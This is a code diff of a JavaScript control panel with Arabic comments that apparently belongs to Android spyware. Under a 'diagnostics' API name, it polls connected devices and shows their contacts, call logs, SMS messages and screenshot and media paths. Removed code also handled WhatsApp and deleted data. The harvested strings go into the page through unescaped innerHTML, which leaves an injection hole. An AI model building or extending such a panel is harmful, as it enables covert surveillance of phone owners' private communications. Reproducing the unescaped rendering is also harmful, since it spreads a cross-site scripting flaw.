@@ -4,13 +4,6 @@ sessionStorage.setItem('logged_in', 'true');
 let currentDevice = null;
 let updateInterval = null;
 let dataInterval = null;
-let allCalls = [];
-let allSMS = [];
-let allContacts = [];
-let allDeleted = [];
-let currentChat = null;
-let currentCallNumber = null;
-let currentContact = null;
 let soundPlayedForDevice = false;
 
 // تسجيل الخروج
@@ -26,30 +19,6 @@ function playNotificationSound() {
         audio.volume = 1.0; 
         audio.play(); 
     } catch (e) {} 
-}
-
-// البحث عن اسم جهة الاتصال
-function findContactName(number) {
-    if (!allContacts || allContacts.length === 0 || !number) return null;
-    const cleanNumber = number.replace(/[^0-9]/g, '').slice(-9);
-    for (let contact of allContacts) {
-        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
-        for (let n of numbers) {
-            if (!n) continue;
-            if (n.replace(/[^0-9]/g, '').slice(-9) === cleanNumber) return contact.name;
-        }
-    }
-    return null;
-}
-
-// عرض الإشعارات العائمة
-function showNotification(title, message, icon) {
-    const div = document.createElement('div');
-    div.className = 'notification-popup';
-    div.innerHTML = `<div class="notification-icon">${icon}</div><div class="notification-content"><div class="notification-title">${title}</div><div class="notification-message">${message}</div></div><button class="notification-close" onclick="this.parentElement.remove()">✕</button>`;
-    document.body.appendChild(div);
-    playNotificationSound();
-    setTimeout(() => { if (div.parentElement) div.remove(); }, 5000);
 }
 
 // تحميل الأجهزة المتصلة من السيرفر مباشرة
@@ -72,7 +41,7 @@ async function loadDevices() {
         
         if (currentValue) { 
             select.value = currentValue; 
-        } else if (devices.length > 0) { 
+        } else if (devices.length > 0 && !currentDevice) { 
             selectDevice(devices[0].id); 
             select.value = devices[0].id; 
         }
@@ -82,76 +51,119 @@ async function loadDevices() {
 // اختيار جهاز محدد
 function selectDevice(deviceId) {
     currentDevice = deviceId;
-    const display = document.getElementById('deviceNameDisplay');
-    
-    if (deviceId) {
-        const select = document.getElementById('deviceSelect');
-        const selectedOption = select.options[select.selectedIndex];
-        const deviceName = selectedOption ? selectedOption.textContent : deviceId;
-        if (display) {
-            display.textContent = `📱 ${deviceName}`;
-            display.className = 'device-name-display active';
-        }
-    } else {
-        if (display) {
-            display.textContent = 'لا يوجد جهاز محدد';
-            display.className = 'device-name-display';
-        }
-    }
-    
-    if (deviceId && !soundPlayedForDevice) {
-        playNotificationSound();
-        soundPlayedForDevice = true;
-        setTimeout(() => { soundPlayedForDevice = false; }, 10000);
-    }
     
     if (updateInterval) clearInterval(updateInterval);
     if (dataInterval) clearInterval(dataInterval);
     
     if (deviceId) {
         updateInterval = setInterval(updateLiveData, 5000);
-        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 10000);
+        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 5000);
         updateLiveData();
         loadAllData();
     }
 }
 
-// تحديث البيانات الحية (البطارية والاتصال)
+// تحديث حالة الاتصال والحياة
 async function updateLiveData() {
     if (!currentDevice) return;
     try {
         const response = await fetch(`/api/diagnostics/${encodeURIComponent(currentDevice)}`);
         const data = await response.json();
         
-        const statusEl = document.getElementById('networkStatus');
+        const statusEl = document.getElementById('netType');
         if (statusEl) {
-            statusEl.textContent = 'متصل'; 
-            statusEl.className = 'value online'; 
+            const pingData = data.diagnostics?.ping;
+            if (pingData) {
+                statusEl.textContent = 'متصل (Online)';
+                statusEl.style.color = 'var(--green)';
+            } else {
+                statusEl.textContent = 'متصل عبر السيرفر';
+                statusEl.style.color = 'var(--green)';
+            }
         }
+    } catch (e) {
+        const statusEl = document.getElementById('netType');
+        if (statusEl) {
+            statusEl.textContent = 'غير متصل';
+            statusEl.style.color = 'var(--red)';
+        }
+    }
+}
+
+// تحميل كافة بيانات الجهاز وعرضها في الجداول والوسائط
+async function loadAllData() {
+    if (!currentDevice) return;
+    try {
+        const response = await fetch(`/api/diagnostics/${encodeURIComponent(currentDevice)}`);
+        const data = await response.json();
+        const diag = data.diagnostics || {};
+
+        // 1. جهات الاتصال (Contacts)
+        if (diag.contacts && Array.isArray(diag.contacts.items)) {
+            const tbody = document.querySelector('#contactsTable tbody');
+            if (tbody) {
+                tbody.innerHTML = '';
+                diag.contacts.items.forEach(item => {
+                    const parts = item.split(':');
+                    const name = parts[0] || 'غير معروف';
+                    const phone = parts.slice(1).join(':') || '';
+                    tbody.innerHTML += `<tr><td>${name}</td><td>${phone}</td></tr>`;
+                });
+            }
+        }
+
+        // 2. سجل المكالمات (Calls)
+        if (diag.calls && Array.isArray(diag.calls.items)) {
+            const tbody = document.querySelector('#callsTable tbody');
+            if (tbody) {
+                tbody.innerHTML = '';
+                diag.calls.items.forEach(item => {
+                    tbody.innerHTML += `<tr><td>سجل مكالمة</td><td>${item}</td></tr>`;
+                });
+            }
+        }
+
+        // 3. الرسائل القصيرة (SMS)
+        if (diag.messages && Array.isArray(diag.messages.items)) {
+            const tbody = document.querySelector('#messagesTable tbody');
+            if (tbody) {
+                tbody.innerHTML = '';
+                diag.messages.items.forEach(item => {
+                    tbody.innerHTML += `<tr><td>رسالة نصية</td><td>${item}</td></tr>`;
+                });
+            }
+        }
+
+        // 4. معرض الصور والوسائط (Media / Camera / Screenshots)
+        if (diag.media && Array.isArray(diag.media.items)) {
+            const studioGallery = document.getElementById('studioGallery');
+            const screenshotsGallery = document.getElementById('screenshotsGallery');
+            
+            if (studioGallery) studioGallery.innerHTML = '';
+            if (screenshotsGallery) screenshotsGallery.innerHTML = '';
+
+            diag.media.items.forEach(filePath => {
+                const card = `<div class="gallery-item">
+                    <div style="width:100%; height:110px; background:#111; display:flex; align-items:center; justify-content:center; color:var(--green); font-size:11px; text-align:center; padding:5px; word-break:break-all;">📁 مسار الملف</div>
+                    <span style="font-size:10px; color:var(--muted); margin:4px 0; word-break:break-all; max-width:100%;">${filePath}</span>
+                </div>`;
+                
+                if (filePath.includes('Screenshots')) {
+                    if (screenshotsGallery) screenshotsGallery.innerHTML += card;
+                } else {
+                    if (studioGallery) studioGallery.innerHTML += card;
+                }
+            });
+        }
+
     } catch (e) {}
 }
 
-// تحميل كافة بيانات الجهاز
-async function loadAllData() {
-    if (!currentDevice) return;
-    await loadCalls();
-    await loadSMS();
-    await loadContacts();
-    await loadImages();
-    await loadApps();
-    await loadDeviceInfo();
-    await loadDeleted();
-    await loadWhatsApp();
-}
-
-// تبديل التبويبات في القائمة الجانبية العمودية المرتبة
+// تبديل التبويبات في القائمة الجانبية
 function switchTab(tabName) {
-    // إزالة النشاط من جميع الأزرار الجانبية
-    document.querySelectorAll('.sidebar-menu button, .tab').forEach(t => t.classList.remove('active'));
-    // إخفاء جميع محتويات التبويبات
+    document.querySelectorAll('.menu-btn').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
     
-    // تفعيل الزر والتبويب المستهدف
     const activeBtn = document.querySelector(`[onclick="switchTab('${tabName}')"]`);
     if (activeBtn) activeBtn.classList.add('active');
     
@@ -159,36 +171,6 @@ function switchTab(tabName) {
     if (pane) pane.classList.add('active');
 }
 
-// تنسيق التواريخ والمدد
-function formatDuration(s) { 
-    if (!s || s < 0) return '0:00'; 
-    return `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`; 
-}
-
-function formatDate(t) { 
-    if (!t) return '—'; 
-    try { return new Date(t).toLocaleString('ar'); } catch (e) { return '—'; } 
-}
-
-function getCallType(t) { 
-    switch(parseInt(t)) { 
-        case 1: return '📥 وارد'; 
-        case 2: return '📤 صادر'; 
-        case 3: return '❌ فائت'; 
-        default: return 'غير معروف'; 
-    } 
-}
-
-// دوال فارغة مؤقتة لاستكمال الجلب البرمجي لمنع الأخطاء
-async function loadCalls() {}
-async function loadSMS() {}
-async function loadContacts() {}
-async function loadImages() {}
-async function loadApps() {}
-async function loadDeviceInfo() {}
-async function loadDeleted() {}
-async function loadWhatsApp() {}
-
-// التهيئة عند التشغيل
+// التهيئة والتشغيل التلقائي
 loadDevices();
 setInterval(loadDevices, 10000);
